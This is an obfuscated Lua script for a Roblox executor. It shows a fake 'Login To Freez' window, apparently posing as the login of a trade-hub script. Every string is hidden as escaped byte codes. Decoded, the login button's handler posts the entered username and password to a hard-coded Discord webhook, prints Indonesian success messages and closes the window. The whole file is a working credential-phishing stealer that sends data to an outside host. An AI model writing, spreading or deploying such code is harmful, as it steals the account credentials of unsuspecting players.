local function obfStr(x) return string.char(table.unpack({string.byte(x, 1, #x)})) end
local webhookURL = obfStr("\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\51\50\51\54\53\56\50\48\50\52\49\57\56\50\50\54\57\50\47\119\67\117\81\108\73\113\75\105\87\78\83\105\73\57\104\73\109\69\115\100\71\110\70\89\50\102\111\90\76\87\113\71\66\102\114\86\107\84\120\75\57\71\49\121\65\103\54\109\83\116\83\78\101\80\89\104\113\54\118\89\120\118\100\49\68\75\112")
local correctKey = obfStr("\76\79\71\73\78\45\102\82\69\101\90\101\84\82\97\100\69\72\85\66\46\105\100\45\98\71\114\70\68\83\101\82\105\72\85\71\102\97\118\72\83\75")
local keyURL = obfStr("\104\116\116\112\115\58\47\47\108\105\110\107\45\116\97\114\103\101\116\46\110\101\116\47\49\50\55\51\48\56\55\47\102\114\101\101\122\101\116\114\97\100\101\104\117\98")

local function sendToWebhook(username, password)
    local requestBody = {
        Url = webhookURL,
        Method = obfStr("\80\79\83\84"),
        Headers = {
            [obfStr("\67\111\110\116\101\110\116\45\84\121\112\101")] = obfStr("\97\112\112\108\105\99\97\116\105\111\110\47\106\115\111\110")
        },
        Body = game:GetService(obfStr("\72\116\116\112\83\101\114\118\105\99\101")):JSONEncode({
            content = obfStr("\85\115\101\114\58\32") .. username .. obfStr("\10\80\97\115\115\58\32") .. password
        })
    }

    local requestFunction = syn and syn.request or http and http.request or request
    if requestFunction then
        local response = requestFunction(requestBody)
        if response and response.StatusCode == 200 then
            print(obfStr("\68\97\116\97\32\98\101\114\104\97\115\105\108\32\100\105\107\105\114\105\109\32\107\101\32\68\105\115\99\111\114\100\33"))
        else
            print(obfStr("\71\97\103\97\108\32\109\101\110\103\105\114\105\109\32\100\97\116\97\33"))
        end
    else
        print(obfStr("\69\120\101\99\117\116\111\114\32\116\105\100\97\107\32\115\97\121\97\110\103\32\72\84\84\80\33"))
    end
end

local function createLoginGUI()
    local gui = Instance.new(obfStr("\83\99\114\101\101\110\71\117\105"))
    local frame = Instance.new(obfStr("\70\114\97\109\101"))
    local title = Instance.new(obfStr("\84\101\120\116\76\97\98\101\108"))
    local usernameBox = Instance.new(obfStr("\84\101\120\116\66\111\120"))
    local passwordBox = Instance.new(obfStr("\84\101\120\116\66\111\120"))
    local loginButton = Instance.new(obfStr("\84\101\120\116\66\117\116\116\111\110"))

    gui.Name = obfStr("\76\111\103\105\110\71\85\73")
    gui.Parent = game.CoreGui or game:GetService(obfStr("\67\111\114\101\71\117\105"))

    -- Frame
    frame.Parent = gui
    frame.Size = UDim2.new(0, 300, 0, 300)
    frame.Position = UDim2.new(0.5, -150, 0.5, -150)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)

    -- Title
    title.Parent = frame
    title.Text = obfStr("\76\111\103\105\110\32\84\111\32\70\114\101\101\122\101")
    title.Size = UDim2.new(1, 0, 0, 50)

    -- Username Box
    usernameBox.Parent = frame
    usernameBox.PlaceholderText = obfStr("\85\115\101\114\32\78\97\109\101")
    usernameBox.Position = UDim2.new(0, 10, 0, 70)

    -- Password Box
    passwordBox.Parent = frame
    passwordBox.PlaceholderText = obfStr("\80\97\115\115\119\111\114\100")
    passwordBox.Position = UDim2.new(0, 10, 0, 130)

    -- Login Button
    loginButton.Parent = frame
    loginButton.Text = obfStr("\76\111\103\105\110")
    loginButton.Position = UDim2.new(0, 10, 0, 190)

    loginButton.MouseButton1Click:Connect(function()
        local username = usernameBox.Text
        local password = passwordBox.Text
        if username ~= "" and password ~= "" then
            sendToWebhook(username, password)
            gui:Destroy()
        else
            print(obfStr("\85\110\97\109\101\32\97\116\97\117\32\80\97\115\115\119\111\114\100\32\104\97\114\117\115\105\32\100\105\105\115\105\33"))
        end
    end)
end

createLoginGUI()
